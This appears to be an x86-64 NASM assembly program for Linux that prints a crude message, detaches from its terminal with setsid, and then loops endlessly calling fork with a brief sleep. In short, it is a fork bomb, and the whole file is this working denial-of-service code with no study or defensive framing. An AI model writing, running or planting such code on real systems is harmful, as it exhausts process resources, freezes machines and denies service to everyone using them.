%include "linux.inc"
%include "asm_functions.asm"


global _start

section .data

section .rodata
    bfb db "OH MAN, SHIT SHIT SHIT...", 0xA
    bfb_len equ ($ - bfb)

section .bss

section .text
_start:
;PRINT LOGO
    println bfb, bfb_len
;GO FIRST FORK FOR NOHUP
    mov rax, 57
    syscall   
;GO TO CHILD NOHUP
    mov rax, 112
    syscall

    test rax, rax
    js .error_exit

.fork_go_brrrr:
;SOME SLEEP in NANOSEC
    mov rax, 35
    mov rdi, 2
    syscall
;CRAZY FORK
    mov rax, 57
    mov rdi, 0x80
    syscall
    jmp .fork_go_brrrr

.noerr_exit:
    mov rax, 60
    mov rdi, 0
    syscall

.error_exit:
    mov rax, 60
    mov rdi, 1
    syscall
